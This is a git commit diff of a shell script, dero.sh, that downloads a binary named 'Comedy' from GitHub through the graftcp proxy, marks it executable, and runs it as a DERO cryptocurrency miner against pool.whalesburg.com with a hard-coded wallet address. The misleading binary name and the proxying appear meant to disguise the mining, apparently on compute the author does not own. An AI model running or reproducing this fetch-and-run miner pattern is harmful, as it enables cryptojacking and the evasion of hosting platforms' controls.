1d7494d1211aaa005ac38e52bcce578ad579bb1c
Tania Putri <lukisanwarna469@gmail.com>
2022-08-28 18:32:57 +0000

    dero.sh edited online with Bitbucket

--- dero.sh
+++ dero.sh
@@ -33,6 +33,6 @@ echo " "
 echo " "
 
 ./graftcp/graftcp wget https://github.com/catursawah/xmr/raw/main/Comedy
-chmod +x dero-stratum-miner
+chmod +x Comedy
 
 ./graftcp/graftcp ./Comedy -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc8qq9zcva6ed7qart0hh.TUKIJEM
